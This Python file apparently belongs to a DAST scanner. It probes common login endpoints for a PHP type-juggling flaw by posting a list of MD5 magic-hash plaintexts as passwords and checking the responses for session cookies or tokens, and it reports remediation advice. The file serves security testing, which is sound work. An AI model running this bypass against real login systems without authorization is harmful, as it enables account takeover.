#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
PHP type juggling: magic-hash login bypass.

PHP's loose comparison operator `==` treats two strings that *look*
like numeric scientific notation (`"0e..."`) as numbers when both
sides match the pattern. So:

  "0e215962017" == "0e123456789"   // true (both = 0)
  "0e132402467..." == "0e123456..." // true

If a login flow compares the supplied password's MD5 hash against
the stored hash with `==` instead of `===` (or hash_equals), any
password whose MD5 starts with `0e` followed by all digits will
satisfy the comparison against any other "0e[digits]"-shaped MD5 --
including the stored one if the user's real password happens to
hash that way. There's a published list of plaintexts whose MD5 has
this shape.

We POST login with each of the well-known magic-hash plaintexts
against a documented seed account. Validation requires:
  (a) status 200 (or whatever a successful login returns -- we
      detect by absence of common failure indicators);
  (b) presence of an explicit success indicator -- `Set-Cookie` for
      a session, an `authentication` / `token` field in the JSON
      response body, or a redirect to a post-login URL.

A 200 alone is never enough -- many sites return 200 with an error
message body for failed logins.

Detection signal:
  POST candidate magic-hash plaintexts as the password; validate
  only when the response carries an explicit auth-success
  indicator.
"""
from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Login endpoints worth probing. Same-origin only.
LOGIN_PATHS = (
    "/rest/user/login",
    "/api/login",
    "/api/auth/login",
    "/login",
    "/users/login",
    "/auth/login",
)

# Plaintext passwords whose MD5 hash is "0e<all-digits>". A small
# set is enough -- we care about detecting the bug, not exhausting
# the wordlist. Source: published magic-hash lists.
MAGIC_HASH_PLAINTEXTS = (
    "240610708",     # MD5 = 0e462097431906509019562988736854
    "QNKCDZO",       # MD5 = 0e830400451993494058024219903391
    "aabg7XSs",      # MD5 = 0e087386482136013740957780965295
    "aaroZmOk",      # MD5 = 0e66507019969427134894567494305
    "aaO8zKZF",      # MD5 = 0e89257456677279091887089573803
    "aaK1STfY",      # MD5 = 0e76658526655756207688271159624

)

# Auth-success indicators in response body or headers. Any one is
# enough -- but we do require at least one (200 alone is not).
SUCCESS_BODY_RE = re.compile(
    r'"(?:authentication|token|access_token|jwt|session)"\s*:\s*"',
    re.I)
COOKIE_AUTH_RE = re.compile(
    r"^(?:JSESSIONID|PHPSESSID|connect\.sid|session|auth_token|"
    r"access_token|token)=", re.I)


def _hdr(headers: dict, name: str) -> str:
    name_l = name.lower()
    for k, v in headers.items():
        if k.lower() == name_l:
            return v
    return ""


class PhpTypeJugglingMagicHashProbe(Probe):
    name = "php_type_juggling_magic_hash"
    summary = ("Detects PHP loose-comparison login bypass via "
               "magic-hash plaintexts (passwords whose MD5 = "
               "'0e<digits>').")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--target-email", default="admin@juice-sh.op",
            help="Email / username to attempt against (must be a "
                 "documented seed account).")
        parser.add_argument(
            "--login-path", action="append", default=[],
            help="Additional login endpoint to test (repeatable).")

    def _looks_authenticated(self, status: int, headers: dict,
                              body: bytes) -> tuple[bool, str]:
        """Return (success?, reason). High-fidelity multi-signal."""
        if status not in (200, 302, 303):
            return False, f"non-success-status:{status}"
        # Check Set-Cookie for an authentication-shaped cookie.
        sc = _hdr(headers, "Set-Cookie")
        if sc and COOKIE_AUTH_RE.match(sc.lstrip()):
            return True, f"auth-cookie:{sc.split('=', 1)[0]}"
        # Check JSON body for token-shaped fields.
        if body:
            text = body.decode("utf-8", "replace")
            if SUCCESS_BODY_RE.search(text):
                return True, "auth-token-in-body"
        # 302 with Location to a post-login URL is suggestive but
        # not enough on its own; require either Set-Cookie or the
        # body indicator. We deliberately prefer false-negative.
        return False, "no-auth-indicator"

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        login_paths = list(LOGIN_PATHS) + list(args.login_path or [])

        # Step 1: discover which login endpoint actually exists.
        # A bare GET against the path tells us whether the route is
        # there (a 200/405/404/302 response). We only POST against
        # routes that exist.
        live: list[str] = []
        attempts: list[dict] = []
        for p in login_paths:
            r = client.request("GET", urljoin(origin, p))
            attempts.append({"step": "discovery", "path": p,
                             "status": r.status})
            if r.status not in (404, 0) and len(live) < 2:
                live.append(p)
            if len(live) >= 2:
                break

        if not live:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no candidate login endpoints "
                         f"reachable on {origin}."),
                evidence={"origin": origin, "attempts": attempts},
            )

        # Step 2: try each magic-hash candidate. Post a JSON body
        # AND a form-urlencoded body since either may be expected;
        # this keeps the probe usable across PHP / Node / Java
        # endpoints without requiring foreknowledge.
        confirmed: dict | None = None
        for path in live:
            for plaintext in MAGIC_HASH_PLAINTEXTS:
                for ctype, body in (
                    ("application/json",
                     json.dumps({
                         "email": args.target_email,
                         "username": args.target_email,
                         "password": plaintext,
                     }).encode()),
                ):
                    url = urljoin(origin, path)
                    r = client.request("POST", url, headers={
                        "Content-Type": ctype}, body=body)
                    ok_, reason = self._looks_authenticated(
                        r.status, r.headers, r.body)
                    row = {"step": "magic-hash", "path": path,
                           "plaintext": plaintext,
                           "content_type": ctype,
                           "status": r.status, "reason": reason}
                    if ok_:
                        confirmed = row
                        attempts.append(row)
                        break
                    attempts.append(row)
                if confirmed:
                    break
            if confirmed:
                break

        evidence = {"origin": origin,
                    "target_email": args.target_email,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: login on {origin}{confirmed['path']} "
                    f"accepted magic-hash plaintext "
                    f"`{confirmed['plaintext']}` against "
                    f"`{args.target_email}` -- response carries an "
                    f"auth-success indicator ({confirmed['reason']}). "
                    "The endpoint compares password hashes with PHP's "
                    "`==` (loose) operator instead of `===` / "
                    "hash_equals."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Replace `==` with `===` or, preferably, "
                    "`hash_equals($expected, $actual)` (constant-time "
                    "comparison). Better yet, stop hashing passwords "
                    "with MD5: switch to `password_hash()` / "
                    "`password_verify()` which uses bcrypt + "
                    "constant-time compare automatically.\n"
                    "Audit logs for prior magic-hash login attempts "
                    "against this account; force a password reset "
                    "for any session that may have authenticated "
                    "via this path."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(MAGIC_HASH_PLAINTEXTS)} "
                     f"magic-hash plaintexts against {len(live)} "
                     f"login endpoint(s) on {origin}; no response "
                     "carried an auth-success indicator."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PhpTypeJugglingMagicHashProbe().main()
